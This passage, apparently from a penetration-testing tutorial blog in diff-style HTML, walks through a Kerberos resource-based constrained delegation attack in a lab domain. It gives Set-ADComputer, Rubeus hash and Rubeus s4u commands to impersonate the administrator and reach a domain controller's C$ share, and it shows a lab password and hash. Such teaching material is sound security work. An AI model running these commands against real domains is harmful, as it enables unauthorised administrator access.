+<h4><span style="color: #000000;">Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties</span></h4>
+<p><span style="color: #000000;">You can use the PowerShell ActiveDirectory module’s cmdlets Set-ADComputer and Get-ADComputer to write and read the attributes of an object (in this case, to modify the delegation rights).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount panther$</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYOcquFXu2G4P3r2ubpx7C_2fwbZSlordJYmopneHANCSDGkG1yYccfZLp0w2taoxbuiul1etmL_2Ey_wd06IyWEf89Byr5I0wgWE0sfq4hl5vgHvtmrDEAB7zbDcjKTc66vbFnW8qcrMz-vLgRcV_GRF1Y5CHAJm2cb38L28n6Gg-q_XU7nSbMBbwNYo1/s16000/41.png"/></span></p>
+<h4><span style="color: #000000;">Generate a Service Ticket for CIFS</span></h4>
+<p><span style="color: #000000;">We can now exploit the delegation with the best kerberos exploitation tool out there, Rubeus: in order to do the S4U attack it requires the machine account user’s AES256 (/aes256) or RC4 (/rc4) key, because these make up the long term secret keys used to encrypt kerberos tickets (plus AES128 and DES). If we have a TGT for our machine account we can use that instead.</span></p>
+<p><span style="color: #000000;">If we do not disable RC4, we’ll see that it coincides with the account’s NT hash (this will be useful in the SPN-less attack!).</span></p>
+<p><span style="color: #000000;">We only need our clear text password to calculate the RC4 key, which is simply an NT hash, while the AES keys also require our user’s name and domain, because they use these as salt for the hashing algorithm.</span></p>
+<p><span style="color: #000000;">The NT hash and AES keys can be computed as follows.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./Rubeus.exe hash /domain:ignite.local /user:panther$ /password:pLXFRC7KAXjWPWm</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmauti352YAzGxNnlvBdtzyVYPetLmXobtP_YLkRYwyUj0cC_BZqCZkzpL6QvymuaZ8MkROB5bPzVwG6ZGPSpwJU6KGe_hcWhXktkJGFs7yUxYg-yiRPfZo_BSd1jghHA8-OqfwSRSR7k9W4g4UQCSX25a6QAlX6qBJVXEUCjZmRaJ-nuapsodhraPP1oW/s16000/42.png"/></span></p>
+<p><span style="color: #000000;"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/GhostPack/Rubeus">Rubeus</a> </strong></span>can then be used to request the TGT and “impersonation ST”, and inject it for later use.</span></p>
+<p><span style="color: #000000;">Armed with a kerberos key we can proceed with the S4U attack specifying an SPN pointing to our target (/msdsspn) and a user to impersonate, here we also include the /ptt flag to have Rubeus load the TGS into our cache so we can pass the ticket to our target from our attacking host.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./Rubeus.exe s4u /user:panther$ /domain:ignite.local /rc4:D9F337ED3B96C2D88D1DA93908CB7833 /impersonateuser:administrator /msdsspn:http/DC /altservice:cifs,host /ptt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1h-zyr2CKltZ3K8Z7ysjjEP1R4uTKFF-zCnqpdiyeuERzN3psj_lYX0NPxCpADpHoaKAnb0A3-Z_Zc-A5EQcSoX5tQ3HIGmJf1CLG9WVK-_OYxFWkw41Clt3HFA-i3PZ0Fwe2VGi-O1IgLLxr534gdKwzuFttu8_l0-ys5IEpDyJRF7CQpq7TY9-BBEgI/s16000/43.png"/></span></p>
+<h4><span style="color: #000000;">Obtain Privileged Access</span></h4>
+<p><span style="color: #000000;">Once the ticket is injected, it can natively be used when accessing the service.</span></p>
+<p><span style="color: #000000;">now we can access the target!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls \\dc\c$</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhEZtB3e_Aqz7cj_C4DDjdc5dXOcwRwa0TH7dtyGZWxh5zR6dRuARf8TGOceYLY37VXHjYzPKlITQNFSuvvwfOJren8Oy2ET3bIRK9wgaMnM37KWe3P9155zVadJ092UeAUYdrIiX6SULqNRL4Jj5FS2hhRNRC8y8uk6C4axvxpmbH2CkIllxdrzXIEOIE/s16000/44.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact</span> <a href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
